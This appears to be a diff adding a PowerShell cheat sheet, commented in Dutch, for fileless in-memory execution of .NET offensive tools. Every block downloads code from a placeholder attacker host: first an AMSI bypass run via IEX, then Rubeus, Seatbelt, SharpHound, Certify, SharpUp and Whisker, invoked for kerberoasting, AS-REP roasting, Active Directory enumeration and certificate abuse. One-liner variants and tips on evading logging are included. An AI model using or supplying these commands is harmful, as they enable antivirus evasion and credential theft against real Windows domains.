@@ -1,0 +1,46 @@
+# In-Memory .NET laden via PowerShell (Assembly.Load)
+# Geen bestand op schijf - assembly direct in geheugen van huidig PS-proces
+
+# === Stap 1: AMSI bypass (eerst uitvoeren) ===
+IEX (New-Object Net.WebClient).downloadString('http://ATTACKER_IP/payloads/amsi-bypass.ps1')
+
+# === Stap 2: Assembly laden en uitvoeren ===
+
+# Rubeus
+$bytes = (New-Object Net.WebClient).DownloadData('http://ATTACKER_IP/tools/Rubeus.exe')
+[Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null, @(,[string[]]@("kerberoast")))
+
+# Rubeus - andere actie
+[Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null, @(,[string[]]@("asreproast")))
+
+# Seatbelt
+$bytes = (New-Object Net.WebClient).DownloadData('http://ATTACKER_IP/tools/Seatbelt.exe')
+[Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null, @(,[string[]]@("-group=all")))
+
+# SharpHound
+$bytes = (New-Object Net.WebClient).DownloadData('http://ATTACKER_IP/tools/SharpHound.exe')
+[Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null, @(,[string[]]@("--CollectionMethods","All")))
+
+# Certify
+$bytes = (New-Object Net.WebClient).DownloadData('http://ATTACKER_IP/tools/Certify.exe')
+[Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null, @(,[string[]]@("find","/vulnerable")))
+
+# SharpUp
+$bytes = (New-Object Net.WebClient).DownloadData('http://ATTACKER_IP/tools/SharpUp.exe')
+[Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null, @(,[string[]]@("audit")))
+
+# Whisker
+$bytes = (New-Object Net.WebClient).DownloadData('http://ATTACKER_IP/tools/Whisker.exe')
+[Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null, @(,[string[]]@("list")))
+
+# === Eén-liner variant (download + laad + uitvoer) ===
+$b=(New-Object Net.WebClient).DownloadData('http://ATTACKER_IP/tools/Rubeus.exe');[Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,@(,[string[]]@("kerberoast")))
+
+# === Via IWR ===
+$bytes = (Invoke-WebRequest 'http://ATTACKER_IP/tools/Rubeus.exe' -UseBasicParsing).Content
+[Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null, @(,[string[]]@("kerberoast")))
+
+# Tip: Werkt in PowerShell 2.0+
+# Tip: Assembly zichtbaar in geheugen proces - combineer met Invisi-Shell voor minder logging
+# Tip: AMSI bypass is verplicht - zonder bypass blokkeert [Reflection.Assembly]::Load bekende tools
+# Tip: Geen argumenten nodig: .Invoke($null, $null) of .Invoke($null, @(,[string[]]@()))
